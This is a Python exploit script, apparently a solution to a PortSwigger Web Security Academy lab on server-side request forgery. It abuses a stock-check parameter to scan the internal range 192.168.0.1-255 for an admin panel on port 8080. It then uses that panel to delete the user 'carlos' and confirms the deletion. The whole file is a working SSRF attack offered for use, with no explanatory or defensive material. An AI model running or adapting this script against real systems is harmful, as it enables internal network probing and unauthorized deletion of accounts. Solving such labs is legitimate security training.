import sys
import requests


def find_admin_interface(url):
    try:
        for i in range(1, 256):
            admin_interface_url = f"http://192.168.0.{i}:8080/admin"
            response = requests.post(f"{url}/product/stock", data={"stockApi": admin_interface_url}, timeout=10)
            if response.status_code == 200:
                return admin_interface_url

    except requests.exceptions.Timeout:
        print("(-) Request timed out. Please check your URL and try again.")
        sys.exit(1)

    except requests.exceptions.RequestException as e:
        print(f"(-) An error has occurred with your request: {e}")
        sys.exit(1)


def delete_carlos_user(url, admin_interface_url):
    # Deleting Carlos user
    requests.post(f"{url}/product/stock", data={"stockApi": f"{admin_interface_url}/delete?username=carlos"}, allow_redirects=False)

    # Verifying Carlos's account has been deleted
    response = requests.post(f"{url}/product/stock", data={"stockApi": admin_interface_url})
    return not "carlos" in response.text


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)


    url = sys.argv[1].rstrip("/")
    print("(+) Finding admin interface...")
    admin_interface_url = find_admin_interface(url)
    if admin_interface_url:
        print(f"(+) Admin interface found at: {admin_interface_url}")
    else:
        print("(-) Admin interface URL not found.")
        sys.exit(1)

    print("(+) Deleting Carlos user...")
    if delete_carlos_user(url, admin_interface_url):
        print("(+) Carlos user successfully deleted")
    else:
        print("(-) Carlos user has not been successfully deleted")


if __name__ == "__main__":
    main()
